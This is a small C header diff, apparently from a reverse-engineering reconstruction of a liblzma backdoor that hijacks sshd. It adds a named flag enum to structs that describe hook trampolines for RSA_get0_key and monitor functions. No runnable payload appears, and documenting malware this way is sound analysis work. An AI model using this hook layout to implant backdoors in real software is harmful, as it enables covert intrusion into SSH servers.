@@ -1527,6 +1527,12 @@ typedef struct __attribute__((packed)) backdoor_hooks_data {
  u8 signed_data; /* First byte of the signed payload blob; rest of the bytes follow immediately in memory. */
 } backdoor_hooks_data_t;
 
+typedef enum {
+ HOOKS_CTX_BOOTSTRAP_WAIT_FOR_SHARED_GLOBALS = 0x4 /* Shared globals missing; bootstrap loops until published. */
+} BackdoorBootstrapStateFlags;
+
+typedef u64 BackdoorBootstrapStateFlags_t; /* Storage for BackdoorBootstrapStateFlags (HOOKS_CTX_BOOTSTRAP_*) bitmask. */
+
 /*
  * Ephemeral orchestrator that stage one reuses while replaying the GOT patches: `hooks_data_slot_ptr` hands back liblzma’s resident blob, the symbind/RSA/mm_* entries point at the trampolines we splice into sshd, and the scratch/placeholder slots keep the structure ABI stable between bootstrap attempts.
  */
@@ -1539,7 +1545,7 @@ typedef struct __attribute__((packed)) backdoor_hooks_ctx {
  pfn_RSA_get0_key_t rsa_get0_key_entry; /* RSA_get0_key replacement pushed into sshd’s PLT. */
  mm_log_handler_fn mm_log_handler_entry; /* mm_log_handler shim we install when hooking sshd. */
  void *mm_log_handler_ctx_slot; /* Reserved slot for the log-hook context pointer (currently unused but keeps the struct layout stable). */
- u64 bootstrap_state_flags; /* Scratch flags touched by hooks_ctx_init_or_wait_for_shared_globals (set to 0x4 during bootstrap retries). */
+ BackdoorBootstrapStateFlags_t bootstrap_state_flags; /* HOOKS_CTX_BOOTSTRAP_WAIT_FOR_SHARED_GLOBALS set while hooks_ctx_init_or_wait_for_shared_globals retries. */
  sshd_monitor_func_t mm_answer_keyallowed_entry; /* mm_answer_keyallowed hook entry point. */
  sshd_monitor_func_t mm_answer_keyverify_entry; /* mm_answer_keyverify hook entry point. */
  void *pending_monitor_hook; /* Placeholder for future monitor-hook trampolines (never populated in this build). */
